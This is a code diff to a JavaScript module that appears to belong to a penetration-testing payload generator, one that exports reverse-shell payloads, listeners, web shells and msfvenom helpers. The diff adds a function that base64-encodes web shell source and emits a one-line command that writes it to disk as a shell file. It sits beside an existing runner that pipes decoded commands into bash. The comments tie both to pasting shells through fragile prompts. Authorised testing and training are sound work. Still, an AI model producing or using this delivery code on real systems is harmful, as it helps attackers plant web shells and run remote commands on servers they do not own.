@@ -106,6 +106,9 @@
   // odd terminals, exactly the trick OffSec teaches for pasting a reverse shell through a fragile prompt.
   function b64Runner(cmd) { return 'echo ' + b64utf8(cmd) + ' | base64 -d | bash'; }
   function urlEncode(cmd) { return encodeURIComponent(String(cmd)); }
+  // A one-line delivery cradle for a web shell file: decode the base64 straight to disk, so a multi-line
+  // JSP/ASPX never gets mangled by pasting raw source over a fragile prompt. ext picks the output name.
+  function webshellCradle(code, ext) { return "echo '" + b64utf8(code) + "' | base64 -d > shell." + (ext || 'php'); }
   // encodePayload(cmd, how): how = 'b64' (base64 runner) | 'url' (percent-encoded) | anything else = raw.
   function encodePayload(cmd, how) { return how === 'b64' ? b64Runner(cmd) : (how === 'url' ? urlEncode(cmd) : String(cmd)); }
 
@@ -179,5 +182,6 @@
     catchers: catchers, catcherById: catcherById, payloads: payloads, fill: fill,
     psEncode: psEncode, psEncodedCommand: psEncodedCommand, ttyUpgrade: ttyUpgrade, listenerKit: listenerKit,
     webshells: webshells, msfvenom: msfvenom, encodePayload: encodePayload, b64Runner: b64Runner, urlEncode: urlEncode,
+    webshellCradle: webshellCradle,
   };
 })(typeof globalThis !== 'undefined' ? globalThis : this);
